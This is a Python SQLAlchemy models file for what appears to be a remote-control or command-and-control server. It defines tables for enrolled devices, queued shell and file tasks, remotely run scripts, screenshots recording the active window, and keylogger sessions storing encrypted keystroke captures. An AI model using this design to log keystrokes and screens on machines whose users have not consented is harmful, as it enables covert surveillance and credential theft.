from sqlalchemy import Column, String, Boolean, DateTime, JSON, ForeignKey, Text, LargeBinary, Integer
from sqlalchemy.sql import func
from database import Base


class Device(Base):
    __tablename__ = "devices"
    
    id = Column(String, primary_key=True)
    hostname = Column(String, nullable=False)
    os = Column(String, nullable=False)
    arch = Column(String)
    ip = Column(String)
    token_hash = Column(String, nullable=False)
    online = Column(Boolean, default=False)
    last_seen = Column(DateTime(timezone=True))
    registered_at = Column(DateTime(timezone=True), server_default=func.now())


class CommandQueue(Base):
    __tablename__ = "command_queue"
    
    id = Column(String, primary_key=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    payload = Column(JSON, nullable=False)
    created_at = Column(DateTime(timezone=True), server_default=func.now())


class CommandResult(Base):
    __tablename__ = "command_results"
    
    id = Column(String, primary_key=True)
    command_id = Column(String, nullable=False)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    result = Column(JSON, nullable=False)
    created_at = Column(DateTime(timezone=True), server_default=func.now())


class KeyloggerSession(Base):
    __tablename__ = "keylogger_sessions"
    
    id = Column(String, primary_key=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    started_at = Column(DateTime(timezone=True), server_default=func.now())
    stopped_at = Column(DateTime(timezone=True), nullable=True)
    started_by = Column(String, nullable=False)  # Username
    status = Column(String, default="active")  # active, stopped


class Keylog(Base):
    __tablename__ = "keylogs"
    
    id = Column(String, primary_key=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    session_id = Column(String, ForeignKey("keylogger_sessions.id"), nullable=True)
    data = Column(LargeBinary, nullable=False)  # Encrypted keylog data
    captured_at = Column(DateTime(timezone=True), nullable=False)
    uploaded_at = Column(DateTime(timezone=True), server_default=func.now())


class Task(Base):
    __tablename__ = "tasks"
    
    id = Column(String, primary_key=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    type = Column(String, nullable=False)  # shell, upload, download, execute, screenshot
    payload = Column(String, nullable=False)  # command, file path, etc.
    status = Column(String, default="pending")  # pending, running, completed, failed
    result = Column(JSON, nullable=True)  # Result data
    error = Column(String, nullable=True)
    created_at = Column(DateTime(timezone=True), server_default=func.now())
    started_at = Column(DateTime(timezone=True), nullable=True)
    completed_at = Column(DateTime(timezone=True), nullable=True)
    retries = Column(Integer, default=0)
    max_retries = Column(Integer, default=3)


class Screenshot(Base):
    __tablename__ = "screenshots"
    
    id = Column(String, primary_key=True)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    filename = Column(String, nullable=False)
    filepath = Column(String, nullable=False)
    file_size = Column(Integer, nullable=False)
    width = Column(Integer, nullable=True)
    height = Column(Integer, nullable=True)
    active_window_title = Column(String, nullable=True)
    active_process_name = Column(String, nullable=True)
    active_process_id = Column(Integer, nullable=True)
    capture_method = Column(String, default="manual")  # manual, scheduled, triggered
    captured_by = Column(String, nullable=True)  # Username who captured it
    tags = Column(JSON, nullable=True)  # User-defined tags
    notes = Column(Text, nullable=True)  # User notes
    captured_at = Column(DateTime(timezone=True), server_default=func.now())
    extra_data = Column(JSON, nullable=True)  # Additional metadata (renamed from 'metadata')


class Script(Base):
    __tablename__ = "scripts"
    
    id = Column(String, primary_key=True)
    name = Column(String, nullable=False)
    description = Column(Text, nullable=True)
    script_type = Column(String, nullable=False)  # cmd, powershell, sh, bash
    content = Column(Text, nullable=False)
    created_by = Column(String, nullable=False)  # Username
    created_at = Column(DateTime(timezone=True), server_default=func.now())
    updated_at = Column(DateTime(timezone=True), onupdate=func.now())


class ScriptExecution(Base):
    __tablename__ = "script_executions"
    
    id = Column(String, primary_key=True)
    script_id = Column(String, ForeignKey("scripts.id"), nullable=False)
    device_id = Column(String, ForeignKey("devices.id"), nullable=False)
    command_id = Column(String, nullable=False)
    status = Column(String, default="pending")  # pending, running, completed, failed
    exit_code = Column(Integer, nullable=True)
    log_file = Column(String, nullable=True)
    executed_by = Column(String, nullable=False)  # Username
    started_at = Column(DateTime(timezone=True), server_default=func.now())
    completed_at = Column(DateTime(timezone=True), nullable=True)
